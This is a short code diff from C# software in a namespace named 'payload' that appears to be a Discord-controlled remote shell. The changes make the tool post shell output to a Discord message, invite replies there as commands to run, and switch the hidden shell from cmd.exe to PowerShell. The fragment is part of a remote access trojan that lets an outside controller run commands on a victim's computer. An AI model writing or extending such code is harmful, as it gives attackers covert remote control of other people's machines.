@@ -32,7 +32,7 @@ namespace payload
                         while (lines.Count > 20) lines.RemoveAt(0);
                         shmessage.ModifyAsync(delegate (MessageProperties m)
                         {
-                            m.Content = "```" + string.Join("\n", lines) + "```";
+                            m.Content = "Reply to this message to input commands.\n```" + string.Join("\n", lines) + "```";
                         }, null).GetAwaiter().GetResult();
                     }
                     Thread.Sleep(500);
@@ -46,7 +46,7 @@ namespace payload
             {
                 StartInfo = new ProcessStartInfo
                 {
-                    FileName = "cmd.exe",
+                    FileName = "powershell.exe",
                     UseShellExecute = false,
                     RedirectStandardInput = true,
                     RedirectStandardOutput = true,
